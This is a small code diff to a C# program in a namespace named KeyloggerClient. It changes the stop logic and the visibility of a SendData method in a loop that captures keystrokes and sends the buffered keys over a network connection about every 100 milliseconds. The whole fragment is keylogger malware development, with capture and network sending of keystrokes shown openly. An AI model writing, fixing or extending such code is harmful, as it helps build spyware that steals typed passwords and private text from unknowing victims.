@@ -58,6 +58,7 @@ namespace KeyloggerClient
 
         public void Stop()
         {
+            _running = false;
             cts?.Cancel();
             stream?.Close();
             client?.Close();
@@ -72,7 +73,6 @@ namespace KeyloggerClient
                     await Task.Delay(5); // Small delay to reduce CPU usage
 
                     CaptureKeys();
-
 
                     await SendData();
                 }
@@ -101,7 +101,7 @@ namespace KeyloggerClient
                 }
             }
         }
-        private async Task SendData()
+        public async Task SendData()
         {
             if ((DateTime.Now - lastSend).TotalMilliseconds >= 100 && keyBuffer.Length > 0)
             {
